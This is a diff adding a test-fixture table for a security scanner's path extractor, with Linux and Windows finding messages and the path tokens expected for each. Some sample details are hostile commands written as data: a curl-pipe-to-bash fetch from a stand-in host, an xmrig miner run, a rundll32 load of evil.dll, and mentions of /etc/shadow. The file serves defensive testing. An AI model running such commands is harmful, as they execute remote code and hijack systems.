@@ -1,0 +1,26 @@
+# platform	message	detail	expect-all	expect-best	note
+# Shared by tests/test-allowlist-path.sh and tests/Test-AllowlistPath.ps1.
+# The allowlist, hash and package-ownership passes only ever see message+detail,
+# so whatever these extractors return IS the set of files a rule can match.
+# NO COLUMN MAY BE EMPTY: bash read collapses consecutive TABs, which would
+# shift every later column. Write "-" for an empty detail / for "no tokens".
+# expect-all : every token the extractor must return, in order, "-" for none.
+# expect-best: al_path_of's single pick (Linux only; "-" = not asserted).
+linux	World-writable system file: /etc/passwd	-	/etc/passwd	/etc/passwd	the simple case: one absolute path, on disk
+linux	Process executing from suspicious path (PID 1)	/tmp/xmrig | cmd: /tmp/xmrig -o pool.example	/tmp/xmrig	/tmp/xmrig	the same path twice must be de-duplicated
+linux	SUID binary outside standard paths: /opt/tools/pkexec	Unusual SUID location	/opt/tools/pkexec	/opt/tools/pkexec	path lives only in the message
+linux	3 executable file(s) in /tmp,/dev/shm,/var/tmp	First 2 of 3: /tmp/a.sh /var/tmp/b.sh | see report section 13	/tmp /dev/shm /var/tmp /tmp/a.sh /var/tmp/b.sh	/tmp	the aggregate: the DIRECTORIES come first, so judging the finding by one token sees /tmp, and dpkg -S /tmp always succeeds
+linux	High volume of failed logins: 60+ in lastb	Possible brute force - review source IPs in report section 04	-	-	structurally unsuppressible: no path token at all
+linux	Second UID-0 account	see /etc/passwd and /etc/shadow	/etc/passwd /etc/shadow	/etc/passwd	several existing paths: the FIRST existing one wins
+linux	Deleted binary A	/nonexistent-tatar-a/x /etc/hosts	/nonexistent-tatar-a/x /etc/hosts	/etc/hosts	a token that is on disk beats an earlier one that is not
+linux	Deleted binary B	/nonexistent-tatar-a/x /nonexistent-tatar-b/y	/nonexistent-tatar-a/x /nonexistent-tatar-b/y	/nonexistent-tatar-a/x	nothing on disk: fall back to the first token
+linux	Notable history command in .bash_history	curl -s http://x.example/p.sh | bash	/x.example/p.sh	/x.example/p.sh	WART, locked in: a URL yields a bogus absolute token. Harmless (no such file, so no rule matches) but it is what the engines see.
+linux	Suspicious cron command	*/5 * * * * root /usr/local/bin/x.sh	/5 /usr/local/bin/x.sh	/5	WART, locked in: the cron schedule contributes "/5", and since no token is on disk the single "best" pick is that bogus one - which is exactly why the suppression pass judges EVERY token instead of this one.
+linux	Relative command	ran ./x.sh from the home directory	/x.sh	/x.sh	WART, locked in: a relative path yields a bogus absolute token.
+linux	Trailing punctuation	Review /etc/hosts.	/etc/hosts.	/etc/hosts.	WART, locked in: a trailing period is part of the token, so the file is not found. Stripping it would WIDEN what an allowlist can suppress, so it stays.
+windows	Service with unusual binary path: Updater	C:\Users\bob\AppData\Local\Temp\x.exe	C:\Users\bob\AppData\Local\Temp\x.exe	-	the simple case
+windows	3 executable file(s) written to temp/appdata locations in the last 14 days	First 2 of 3: C:\Users\bob\AppData\Local\Temp\a.exe C:\Windows\Temp\b.dll | see report section 28	C:\Users\bob\AppData\Local\Temp\a.exe C:\Windows\Temp\b.dll	-	the aggregate carried no path at all, so no allowlist rule could reach it
+windows	LOLBAS pattern: rundll32	rundll32.exe C:\Temp\evil.dll,Start	C:\Temp\evil.dll	-	the extension boundary stops at the comma
+windows	Service with unusual binary path: Foo	"C:\Program Files\App\svc.exe" -k netsvcs	C:\Program Files\App\svc.exe	-	quoted path with spaces; the quotes are excluded
+windows	High volume of failed logons (4625): 15+ in recent Security log	See report section 04	-	-	structurally unsuppressible: no drive-letter path
+windows	Unquoted service path	C:\Program Files\App\svc.exe C:\Program Files\App\svc.exe	C:\Program Files\App\svc.exe	-	the same path twice must be de-duplicated
